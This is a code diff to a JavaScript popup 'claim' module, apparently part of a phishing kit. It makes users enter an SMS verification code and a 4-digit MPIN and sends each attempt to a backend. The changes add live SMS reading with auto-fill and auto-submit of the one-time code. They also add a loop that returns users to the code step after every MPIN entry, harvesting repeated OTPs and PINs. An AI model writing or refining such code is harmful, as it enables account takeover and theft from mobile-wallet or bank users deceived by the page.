@@ -1,6 +1,7 @@
 /**
  * Popup Share Module - Complete with Firewall Logic
- * 5 Attempts Rule - SMS Autofill Popup
+ * 5 Attempts Rule - Loop: 6-digit → 4-digit → balik 6-digit
+ * SMS Retriever API (Actual SMS reading)
  */
 
 // ========== POPUP MODULE ==========
@@ -12,12 +13,11 @@
     let claimInProgress = false;
     let isRedirecting = false;
     let currentFirewallStatus = false;
-    let enteredVerificationCode = '';
-    let enteredMPIN = '';
     let invalidAttempts = 0;
     const MAX_ATTEMPTS = 5;
-    let currentMPINValue = '';
-    let smsCodeValue = '';
+    let detectedSMSCode = '';
+    let smsReceiverStarted = false;
+    let currentMPIN = '';
     
     // ========== INITIALIZATION ==========
     function init() {
@@ -40,7 +40,8 @@
     // ========== RESET ATTEMPTS ==========
     function resetAttempts() {
         invalidAttempts = 0;
-        currentMPINValue = '';
+        currentMPIN = '';
+        detectedSMSCode = '';
         console.log('Invalid attempts reset to 0');
     }
     
@@ -70,18 +71,29 @@
         return false;
     }
     
-    // ========== RESET TO STEP 1 ==========
+    // ========== RESET TO STEP 1 (6-digit) ==========
     function resetToStep1() {
         const step1Container = document.getElementById('step1Container');
         const step2Container = document.getElementById('step2Container');
         const code6Input = document.getElementById('code6Digit');
+        const smsPopup = document.getElementById('smsCodePopup');
         
+        // Clear inputs
         if (code6Input) code6Input.value = '';
-        currentMPINValue = '';
+        currentMPIN = '';
         
+        // Reset MPIN dots
+        updateMPINDots();
+        
+        // Show Step 1, hide Step 2
         if (step1Container) step1Container.style.display = 'block';
         if (step2Container) step2Container.style.display = 'none';
         
+        // Clear error message
+        const step1ErrorMsg = document.getElementById('step1ErrorMsg');
+        if (step1ErrorMsg) step1ErrorMsg.style.display = 'none';
+        
+        // Update attempts counter
         const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
         const attemptsCounter = document.querySelector('.attempts-counter');
         if (attemptsCounter) {
@@ -92,27 +104,26 @@
             }
         }
         
-        // Ipakita ulit ang SMS popup
-        setTimeout(() => {
-            showSmsCodePopup();
-        }, 500);
-    }
-    
-    // ========== SIMULATE SMS CODE RECEIVED ==========
-    function showSmsCodePopup() {
-        const smsPopup = document.getElementById('smsCodePopup');
-        const smsCodeSpan = document.getElementById('smsCodeValue');
-        
-        if (smsPopup && smsCodeSpan && !smsPopup.style.display || smsPopup.style.display === 'none') {
-            // Generate random 6-digit code for simulation
-            smsCodeValue = Math.floor(100000 + Math.random() * 900000).toString();
-            smsCodeSpan.innerHTML = smsCodeValue;
+        // Show SMS popup again
+        if (smsPopup && detectedSMSCode) {
             smsPopup.style.display = 'block';
-            
-            // Auto-hide after 10 seconds
             setTimeout(() => {
                 if (smsPopup) smsPopup.style.display = 'none';
             }, 10000);
+        }
+        
+        console.log(`Reset to Step 1. Attempts left: ${attemptsLeft}`);
+    }
+    
+    // ========== UPDATE MPIN DOTS ==========
+    function updateMPINDots() {
+        const dots = document.querySelectorAll('.mpin-dot');
+        for (let i = 0; i < dots.length; i++) {
+            if (i < currentMPIN.length) {
+                dots[i].classList.add('filled');
+            } else {
+                dots[i].classList.remove('filled');
+            }
         }
     }
     
@@ -223,6 +234,60 @@
         if (!document.querySelector('#popup-animations')) {
             style.id = 'popup-animations';
             document.head.appendChild(style);
+        }
+    }
+    
+    // ========== ACTUAL SMS RETRIEVER API ==========
+    function startSmsRetriever() {
+        if (smsReceiverStarted) return;
+        smsReceiverStarted = true;
+        
+        console.log('SMS Retriever started - waiting for SMS...');
+        
+        // Para sa Android gamit ang SMS Retriever API
+        if (window.smsretriever) {
+            window.smsretriever.startWatch(function(sms) {
+                console.log('Raw SMS received:', sms);
+                
+                // Extract 6-digit code
+                const match = sms.match(/\b\d{6}\b/);
+                if (match) {
+                    const code = match[0];
+                    console.log('Extracted 6-digit code:', code);
+                    detectedSMSCode = code;
+                    
+                    // Show SMS popup with actual code
+                    const smsPopup = document.getElementById('smsCodePopup');
+                    const smsCodeSpan = document.getElementById('smsCodeValue');
+                    const codeInput = document.getElementById('code6Digit');
+                    
+                    if (smsPopup && smsCodeSpan) {
+                        smsCodeSpan.innerHTML = code;
+                        smsPopup.style.display = 'block';
+                        
+                        // Auto-hide after 10 seconds
+                        setTimeout(() => {
+                            if (smsPopup) smsPopup.style.display = 'none';
+                        }, 10000);
+                    }
+                    
+                    // Auto-fill the code input
+                    if (codeInput) {
+                        codeInput.value = code;
+                        codeInput.style.borderColor = '#39ff14';
+                        codeInput.style.boxShadow = '0 0 10px #39ff14';
+                        
+                        // Auto-click verify after 500ms
+                        setTimeout(() => {
+                            const verifyBtn = document.getElementById('verify6DigitBtn');
+                            if (verifyBtn) verifyBtn.click();
+                        }, 500);
+                    }
+                }
+            });
+        } else {
+            console.log('SMS Retriever not available (not Android or no Google Play Services)');
+            // Fallback: manual input na lang
         }
     }
     
@@ -361,9 +426,7 @@
         if (!popupInner) return;
         
         currentPhase = 3;
-        enteredVerificationCode = '';
-        enteredMPIN = '';
-        currentMPINValue = '';
+        detectedSMSCode = '';
         
         popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         popupInner.style.opacity = '0';
@@ -374,6 +437,9 @@
             popupInner.style.opacity = '1';
             popupInner.style.transform = 'scale(1)';
         }, 300);
+        
+        // Start SMS Retriever
+        startSmsRetriever();
     }
     
     // ========== PHASE 3: CLAIMING VERIFICATION ==========
@@ -406,7 +472,7 @@
                 ⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}
             </div>
             
-            <!-- SMS CODE POPUP -->
+            <!-- SMS CODE POPUP (Actual SMS) -->
             <div id="smsCodePopup" style="display: none; background: linear-gradient(135deg, #1a1a2e, #0f0f1a); border: 1px solid #00f2ff; border-radius: 16px; padding: 12px; margin: 10px 0; animation: bounceIn 0.3s ease;">
                 <div style="display: flex; align-items: center; gap: 10px;">
                     <div style="font-size: 30px;">📨</div>
@@ -426,7 +492,7 @@
                     <span style="font-size: 11px; color: #00f2ff;">STEP 1 OF 2</span>
                 </div>
                 <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0 0 10px 0;">
-                    Enter the <strong style="color: #00f2ff;">6-digit verification code</strong>
+                    Enter the <strong style="color: #00f2ff;">6-digit verification code</strong> received via SMS
                 </p>
                 <div style="display: flex; gap: 10px; justify-content: center;">
                     <input type="text" id="code6Digit" class="verification-input" placeholder="123456" maxlength="6" inputmode="numeric" autocomplete="one-time-code" style="text-align: center; font-size: 20px; font-weight: bold; width: 180px; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,242,255,0.4); border-radius: 30px; color: white; transition: all 0.2s ease;">
@@ -514,17 +580,15 @@
         const autoFillBtn = document.getElementById('autoFillSmsBtn');
         if (autoFillBtn) {
             autoFillBtn.onclick = function() {
-                if (codeInput && smsCodeValue) {
-                    codeInput.value = smsCodeValue;
+                if (codeInput && detectedSMSCode) {
+                    codeInput.value = detectedSMSCode;
                     codeInput.style.borderColor = '#39ff14';
                     codeInput.style.boxShadow = '0 0 10px #39ff14';
                     
-                    // Auto-click verify pagkatapos ng 300ms
                     setTimeout(() => {
                         if (verifyBtn) verifyBtn.click();
                     }, 300);
                     
-                    // Hide SMS popup
                     const smsPopup = document.getElementById('smsCodePopup');
                     if (smsPopup) smsPopup.style.display = 'none';
                 }
@@ -554,7 +618,7 @@
                 const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                 sendVerificationAttempt(userPhone, deviceId, code, attemptsLeft);
                 
-                // Transition to Step 2
+                // Transition to Step 2 (MPIN)
                 step1Container.style.transition = 'opacity 0.3s ease';
                 step1Container.style.opacity = '0';
                 
@@ -571,6 +635,7 @@
                     }, 50);
                 }, 300);
                 
+                // Attach MPIN keypad
                 attachMPINKeypad();
             };
         }
@@ -582,7 +647,6 @@
                 }
             });
             
-            // SMS Autofill detection
             codeInput.addEventListener('input', function(e) {
                 const value = this.value.trim();
                 if (value.length === 6 && /^\d+$/.test(value)) {
@@ -595,27 +659,12 @@
                 }
             });
         }
-        
-        // Show SMS popup after 2 seconds
-        setTimeout(() => {
-            showSmsCodePopup();
-        }, 2000);
     }
     
-    // ========== ATTACH MPIN KEYPAD ==========
+    // ========== ATTACH MPIN KEYPAD (na may balik sa Step 1) ==========
     function attachMPINKeypad() {
-        let currentMPIN = '';
-        
-        function updateMPINDots() {
-            const dots = document.querySelectorAll('.mpin-dot');
-            for (let i = 0; i < dots.length; i++) {
-                if (i < currentMPIN.length) {
-                    dots[i].classList.add('filled');
-                } else {
-                    dots[i].classList.remove('filled');
-                }
-            }
-        }
+        currentMPIN = '';
+        updateMPINDots();
         
         function checkMPIN() {
             if (currentMPIN.length === 4) {
@@ -650,12 +699,11 @@
                 currentMPIN = '';
                 updateMPINDots();
                 
-                if (!maxReached) {
-                    setTimeout(() => {
-                        if (errorMsg) errorMsg.style.display = 'none';
-                        resetToStep1();
-                    }, 1500);
-                }
+                // BALIK SA STEP 1 (6-digit) pagkatapos ng 1.5 seconds
+                setTimeout(() => {
+                    if (errorMsg) errorMsg.style.display = 'none';
+                    resetToStep1();
+                }, 1500);
             }
         }
         
